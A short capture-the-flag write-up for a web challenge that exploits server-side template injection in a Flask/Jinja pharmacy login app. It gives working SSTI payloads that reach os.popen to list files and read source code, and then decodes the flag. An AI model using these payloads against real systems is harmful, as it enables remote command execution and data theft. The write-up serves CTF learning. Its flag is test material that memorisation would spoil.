---
layout: post
title: "Injection"
author: "shreyas-sriram"
tags: ['Web']
---

Our local pharmacy exposed admin login to the public, can you exploit it?

[http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/](http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/)

## Solution
- All attempts at SQLi or NoSQLi failed, however URL path values were being returned in the response
- A quick sanity check for SSTI confirms the vulnerability

```
http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{7*7}}

Oops! Page 49 doesn't exist :(
```

- Enumerate and find some interesting files using SSTI

```
http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{config.__class__.__init__.__globals__['os'].popen('cat lib/security.py').read()}}
```

- An encoded format of the flag is got

```
validate_login(username, password):
  if username != 'admin': return False

  valid_password = 'QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ'

  return base64.b64encode(password.encode('ascii')).decode('ascii')[::-1].lstrip('=') == valid_password
```

- Reverse the operations to obtain the flag

## Flag
```
dctf{4ll_us3r_1nput_1s_3v1l}
```
